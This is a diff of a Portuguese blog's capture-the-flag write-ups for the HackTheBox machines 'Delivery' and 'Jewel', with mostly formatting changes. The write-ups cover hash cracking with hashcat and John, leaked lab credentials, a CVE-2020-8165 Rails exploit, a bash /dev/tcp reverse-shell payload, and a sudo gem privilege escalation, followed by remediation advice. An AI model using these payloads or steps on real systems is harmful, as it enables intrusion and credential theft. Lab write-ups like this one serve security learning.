-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -l /usr/share/hashcat/rules/</code></pre></div>
-<p>Para gerar esta wordlist foi selecionada a &ldquo;best64.rule&rdquo;, muito utilizada em CTFs.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat --force pattern -r /usr/share/hashcat/rules/best64.rule --stdout &gt; passwords.txt</code></pre></div>
-<p>O comando irá gerar um arquivo passwords.txt com todas as variações de senhas. Logo em seguida se procede com a quebra da hash.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">3200</span> hash passwords.txt</code></pre></div>
-<p>A saída do comando revela a senha encontrada do usuário root.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -l /usr/share/hashcat/rules/
+</code></pre></div><p>Para gerar esta wordlist foi selecionada a &ldquo;best64.rule&rdquo;, muito utilizada em CTFs.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat --force pattern -r /usr/share/hashcat/rules/best64.rule --stdout &gt; passwords.txt
+</code></pre></div><p>O comando irá gerar um arquivo passwords.txt com todas as variações de senhas. Logo em seguida se procede com a quebra da hash.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">3200</span> hash passwords.txt
+</code></pre></div><p>A saída do comando revela a senha encontrada do usuário root.</p>
 
     <img src="https://i.imgur.com/Mn6w8aA.png"  alt="Crack hash"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <pre><code>PleaseSubscribe!21
-</code></pre>
-
-<p>Como citado anteriormente, esta nova senha revelada é uma variação da senha original &ldquo;PleaseSubscribe!&rdquo;.</p>
-
+</code></pre><p>Como citado anteriormente, esta nova senha revelada é uma variação da senha original &ldquo;PleaseSubscribe!&rdquo;.</p>
 <p>Alterando para o usuário root pelo terminal com a senha descoberta.</p>
-
 
     <img src="https://i.imgur.com/PEBEeXX.png"  alt="Root login"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Acessando a flag do usuário root.</p>
-
 
     <img src="https://i.imgur.com/oBqoVEQ.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Com acesso ao root a máquina &lsquo;Delivery&rsquo; está terminada.</p>
 
-
     <img src="https://i.imgur.com/oM7pTAq.png"  alt="Pwned"  class="center"  style="border-radius: 8px;"  />
-
 
 
 <p>Até a próxima!</p>
@@ -534,98 +681,70 @@ Sistema Operacional: Linux
 Nível de dificuldade: Médio
 Varredura e Enumeração Port Scan Ao executar o Nmap são mostradas três portas abertas: 22, 8000 e 8080.</description>
             <content type="html"><![CDATA[
-
-
     <img src="https://i.imgur.com/IzIVCYq.png"  alt="Jewel Cover"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>Neste primeiro post veremos a resolução da máquina &lsquo;Jewel&rsquo; do <a href="https://www.hackthebox.eu/" target="_blank">HackTheBox</a>. A resolução foi efetuada em outubro de 2020, quando a máquina estava &lsquo;ativa&rsquo;. Em fevereiro de 2021 a mesma passou para &lsquo;retirada&rsquo; e com as evidências coletadas anteriormente foi possível publicar este &lsquo;writeup&rsquo;.</p>
-
+<p>Neste primeiro post veremos a resolução da máquina &lsquo;Jewel&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>. A resolução foi efetuada em outubro de 2020, quando a máquina estava &lsquo;ativa&rsquo;. Em fevereiro de 2021 a mesma passou para &lsquo;retirada&rsquo; e com as evidências coletadas anteriormente foi possível publicar este &lsquo;writeup&rsquo;.</p>
 <h3 id="informações-da-máquina">Informações da Máquina</h3>
-
 <p>IP: 10.10.10.211</p>
-
 <p>Sistema Operacional: Linux</p>
-
 <p>Nível de dificuldade: Médio</p>
-
 <h3 id="varredura-e-enumeração">Varredura e Enumeração</h3>
-
 <h4 id="port-scan">Port Scan</h4>
-
 <p>Ao executar o Nmap são mostradas três portas abertas: 22, 8000 e 8080.</p>
-
 
     <img src="https://i.imgur.com/tytB0Oe.png"  alt="Nmap"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Utilizando os parâmetros do Nmap podemos executar também os scripts padrões para verificar vulnerabilidades, as versões dos serviços que estão rodando e gerar um arquivo com o resultado do scan.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">nmap -v -sC -sV -p 22,8000,8080 -Pn 10.10.10.211 -oN jewel-detail</code></pre></div>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">nmap -v -sC -sV -p 22,8000,8080 -Pn 10.10.10.211 -oN jewel-detail
+</code></pre></div>
     <img src="https://i.imgur.com/YJXvrR8.png"  alt="Nmap detalhes"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <h4 id="webserver">Webserver</h4>
-
 <p>Na saída do comando Nmap é possível verificar duas aplicações Web rodando, uma na porta 8000 e outra na 8080.
 Na porta 8080, onde o Apache é executado, surge um &lsquo;Blog&rsquo;, permitindo o cadastro de usuário, login e edição do usuário cadastrado.</p>
-
-<p>URL: <a href="http://10.10.10.211:8080/" target="_blank">http://10.10.10.211:8080/</a></p>
-
+<p>URL: http://10.10.10.211:8080/</p>
 
     <img src="https://i.imgur.com/VNqtOy2.png"  alt="Editar usuário"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Ao acessar o link para o recurso &lsquo;gitweb&rsquo; na porta 8000 surge o código fonte do &lsquo;Blog&rsquo;, tendo o Git como seu sistema de controle de versão.</p>
-
-<p>URL: <a href="http://10.10.10.211:8000/gitweb/" target="_blank">http://10.10.10.211:8000/gitweb/</a></p>
-
+<p>URL: http://10.10.10.211:8000/gitweb/</p>
 
     <img src="https://i.imgur.com/d7HCbmI.png"  alt="Gitweb"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>O acesso às aplicações pode ser feito através de seu IP ou pelo seu domínio, editando o arquivo /etc/hosts na máquina do atacante.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo vi /etc/hosts</code></pre></div>
-<p>Inserir a linha correspondente ao arquivo.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.211  jewel.htb</code></pre></div>
-<p>Desta forma as aplicações podem ser acessadas pelo browser com as seguintes URLs.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo vi /etc/hosts
+</code></pre></div><p>Inserir a linha correspondente ao arquivo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.211  jewel.htb
+</code></pre></div><p>Desta forma as aplicações podem ser acessadas pelo browser com as seguintes URLs.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://jewel.htb:8080/
-http://jewel.htb:8000/gitweb/</code></pre></div>
-<h3 id="vulnerabilidades">Vulnerabilidades</h3>
-
+http://jewel.htb:8000/gitweb/
+</code></pre></div><h3 id="vulnerabilidades">Vulnerabilidades</h3>
 <p>O sistema permite visualizar o perfil de outros usuários, sendo necessário apenas alterar a id do usuário na URL. Com isto foi possível obter o nome de usuário bill (id=01) e jennifer (id=02).</p>
-
 
     <img src="https://i.imgur.com/gEeZYw6.png"  alt="Blog"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Além de poder visualizar os dados de outros usuários é possível alterar suas publicações e o campo de texto é vulnerável a HTML Injection.</p>
 
-
     <img src="https://i.imgur.com/0q4O6JU.png"  alt="HTML Injection"  class="center"  style="border-radius: 8px;"  />
-
 
 
 <p>Analisando o código fonte do HTML foi encontrado o campo de senha comentado no form de usuário. Descomentando o código torna-se possível a alteração de senha do usuário.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
     &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user_password&#34;</span>&gt;Password&lt;/<span style="color:#f92672">label</span>&gt;
     &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user[password]&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user_password&#34;</span> /&gt;
-&lt;/<span style="color:#f92672">div</span>&gt;</code></pre></div>
-<p>Como se trata de uma aplicação onde o código fonte do &lsquo;Blog&rsquo; é gerenciado pelo Git, é possível navegar pela página e obter informações sobre a linguagem de programação (Ruby), o framework utilizado (Ruby on Rails) e suas versões.</p>
-
+&lt;/<span style="color:#f92672">div</span>&gt;
+</code></pre></div><p>Como se trata de uma aplicação onde o código fonte do &lsquo;Blog&rsquo; é gerenciado pelo Git, é possível navegar pela página e obter informações sobre a linguagem de programação (Ruby), o framework utilizado (Ruby on Rails) e suas versões.</p>
 
     <img src="https://i.imgur.com/LF5vrJr.png"  alt="Commit"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Obtendo as credenciais na tabela users.</p>
-
 
     <img src="https://i.imgur.com/UDDE3iO.png"  alt="Credentials"  class="center"  style="border-radius: 8px;"  />
 
@@ -634,143 +753,107 @@ http://jewel.htb:8000/gitweb/</code></pre></div>
 $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
 
 jennifer  jennifer@mail.htb  2020-08-25 08:54:42.8483  2020-08-25 08:54:42.8483        
-$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</code></pre></div>
-<p>Ao executar o Linpeas no host mais credenciais foram descobertas.</p>
+$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
+</code></pre></div><p>Ao executar o Linpeas no host mais credenciais foram descobertas.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">[+] Finding &#39;pwd&#39; or &#39;passw&#39; variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
 /home/bill/blog/config/database.yml:  password: beiw,aDoed1
 
 [+] Searching specific hashes inside files - less false positives (limit 70)
 /var/backups/dump_2020-08-27.sql:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
-/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW</code></pre></div>
-<p>Conteúdo do arquivo /home/bill/blog/config/database.yml.</p>
+/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+</code></pre></div><p>Conteúdo do arquivo /home/bill/blog/config/database.yml.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">production:
   &lt;&lt;: *default
   database: blog_development
   host: localhost
   port: 5432
   username: rails_dev
-  password: beiw,aDoed1</code></pre></div>
-<p>Os dados do banco de dados PostgreSQL também estão expostos. No arquivo bd.sql a versão do banco e suas tabelas podem ser visualizadas.</p>
-
+  password: beiw,aDoed1
+</code></pre></div><p>Os dados do banco de dados PostgreSQL também estão expostos. No arquivo bd.sql a versão do banco e suas tabelas podem ser visualizadas.</p>
 
     <img src="https://i.imgur.com/qj8LYnT.png"  alt="bd.sql"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Estrutura de tabelas no dump db.sql.</p>
-
 
     <img src="https://i.imgur.com/xVLzmr6.png"  alt="bd.sql"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Também foi possível encontrar a versão do Ruby e do Gem (Gerenciador de Pacotes do Ruby).</p>
-
 
     <img src="https://i.imgur.com/cS79HSr.png"  alt="Ruby Version"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>De posse das credenciais obtidas, nome de usuário e &lsquo;hashes&rsquo;, foi utilizado o hashcat para identificar o tipo de hash utilizado para o campo de senha. De acordo com o hashcat trata-se de uma hash bcrypt.</p>
-
 
     <img src="https://i.imgur.com/fbU36GI.png"  alt="Hashcat"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Com o john foi possível quebrar o &lsquo;hash&rsquo; do usuário bill. A senha revelada é &lsquo;spongebob&rsquo;.</p>
-
 
     <img src="https://i.imgur.com/nPlJmyJ.png"  alt="John"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>Pesquisando por vulnerabilidades na versão 5.2.2.1 do Rails foi descoberta a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165" target="_blank">CVE-2020-8165</a> no site <a href="https://cve.mitre.org/" target="_blank">mitre.org</a>.</p>
-
+<p>Pesquisando por vulnerabilidades na versão 5.2.2.1 do Rails foi descoberta a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165">CVE-2020-8165</a> no site <a href="https://cve.mitre.org/">mitre.org</a>.</p>
 
     <img src="https://i.imgur.com/bRgeBwk.png"  alt="CVE-2020-8165"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Trata-se de uma vulnerabilidade de desserialização de dados não confiáveis que existe nas versões do Rails &lt;5.2.4.3, Rails &lt;6.0.3.1 e que pode permitir que um invasor desempacote objetos fornecidos pelo usuário em MemCacheStore e RedisCacheStore, resultando potencialmente em um RCE (Remote Code Execution).</p>
-
 <h3 id="exploração">Exploração</h3>
-
-<p>Buscando por exploits para a <a href="https://github.com/masahiro331/CVE-2020-8165" target="_blank">CVE-2020-8165</a> foi encontrado no <a href="https://github.com/" target="_blank">github</a> um exploit público.</p>
-
+<p>Buscando por exploits para a <a href="https://github.com/masahiro331/CVE-2020-8165">CVE-2020-8165</a> foi encontrado no <a href="https://github.com/">github</a> um exploit público.</p>
 
     <img src="https://i.imgur.com/uUSwT37.png"  alt="Pesquisa de Exploits"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>O exploit consiste em encodar uma string de comando que será o payload a ser enviado ao servidor. O envio do payload é efetuado duas vezes usando o curl e o alvo utilizado é a página de cadastro de usuário.</p>
-
 <p>Para obter uma shell reversa o IP e porta no payload devem ser configurados conforme a máquina do atacante. O resultado será uma URL codificada, que pode ser usada no envio do cadastro de usuário através da interceptação da requisição com o Burp Suite. Ou diretamente com o curl, enviando duas requisições seguidas, conforme orientação do manual do exploit.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">irb(main):&gt; code = &#39;`/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#34;`&#39;</code></pre></div>
-<p>Obtendo a shell reversa.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">irb(main):&gt; code = &#39;`/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#34;`&#39;
+</code></pre></div><p>Obtendo a shell reversa.</p>
 
     <img src="https://i.imgur.com/yFVyS2Y.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Obtendo a flag do usuário bill.</p>
-
 
     <img src="https://i.imgur.com/8hWl8Wx.png"  alt="User Key"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
-
 <p>Após executar o exploit com o payload e receber a shell reversa foi possível analisar o conteúdo do diretório do usuário bill. Neste diretório foi encontrado o arquivo oculto do Google Authenticator.</p>
-
 
     <img src="https://i.imgur.com/PVwPiZF.png"  alt="Diretório Bill"  class="center"  style="border-radius: 8px;"  />
 
 
-
-<p>Ao tentar executar algum comando com o &lsquo;sudo&rsquo; utilizando este usuário surge a solicitação do código de autenticação do <a href="https://github.com/google/google-authenticator/wiki" target="_blank">Google Authenticator</a> (verificação em duas etapas).</p>
-
-<p>O código de verificação pode ser obtido com o addon <a href="https://addons.mozilla.org/pt-BR/firefox/addon/auth-helper/" target="_blank">Authenticator</a> instalado no browser.</p>
-
+<p>Ao tentar executar algum comando com o &lsquo;sudo&rsquo; utilizando este usuário surge a solicitação do código de autenticação do <a href="https://github.com/google/google-authenticator/wiki">Google Authenticator</a> (verificação em duas etapas).</p>
+<p>O código de verificação pode ser obtido com o addon <a href="https://addons.mozilla.org/pt-BR/firefox/addon/auth-helper/">Authenticator</a> instalado no browser.</p>
 <p>Para utilizar o código gerado a data e horário do host devem estar sincronizados com a máquina do atacante. Para isto é necessário desabilitar o NTP de fuso-horário automático e setar a hora manualmente, de acordo com a hora e minutos da máquina Jewel.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ timedatectl set-ntp false
-$ sudo timedatectl set-time <span style="color:#e6db74">&#39;2020-10-26 22:34:18&#39;</span></code></pre></div>
-<p>Após efetuar a sincronização e gerar o código de verificação com o addon Authenticator é possível autenticar com as credenciais bill:spongebob e checar que tipo de permissões possui o usuário.</p>
-
+$ sudo timedatectl set-time <span style="color:#e6db74">&#39;2020-10-26 22:34:18&#39;</span>
+</code></pre></div><p>Após efetuar a sincronização e gerar o código de verificação com o addon Authenticator é possível autenticar com as credenciais bill:spongebob e checar que tipo de permissões possui o usuário.</p>
 
     <img src="https://i.imgur.com/nX6brom.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>O usuário bill possui privilégios de root no gem (gerenciador de pacotes do Ruby).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">(ALL : ALL) /usr/bin/gem</code></pre></div>
-<p>Buscando no <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> é possível encontrar a forma de escalar privilégios com o gem usando o sudo.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">(ALL : ALL) /usr/bin/gem
+</code></pre></div><p>Buscando no <a href="https://gtfobins.github.io/">GTFOBins</a> é possível encontrar a forma de escalar privilégios com o gem usando o sudo.</p>
 
     <img src="https://i.imgur.com/QkM9UxI.png"  alt="GTFOBins"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Obtenção de root após a execução do comando com o sudo.</p>
-
 
     <img src="https://i.imgur.com/TfwyjMs.png"  alt="Privesc"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <p>Obtendo a flag do usuário root.</p>
-
 
     <img src="https://i.imgur.com/xp0tPmt.png"  alt="Flag Root"  class="center"  style="border-radius: 8px;"  />
 
 
-
 <h3 id="recomendações">Recomendações</h3>
-
 <p>Caso fosse um Pentest realizado para alguma empresa, estas seriam as recomendações para solucionar os problemas encontrados no host.</p>
-
 <ul>
 <li>Implementar um sistema de permissão de acesso à aplicação &lsquo;gitweb&rsquo;. Deve ser de uso restrito dos desenvolvedores do sistema e não deve estar acessível para qualquer usuário. Outra opção é remover a sua disponibilidade.</li>
 <li>Implementar a verificação de sessão de usuário na aplicação &lsquo;Blog&rsquo; para impedir que um usuário logado possa visualizar os dados de outros usuários.</li>
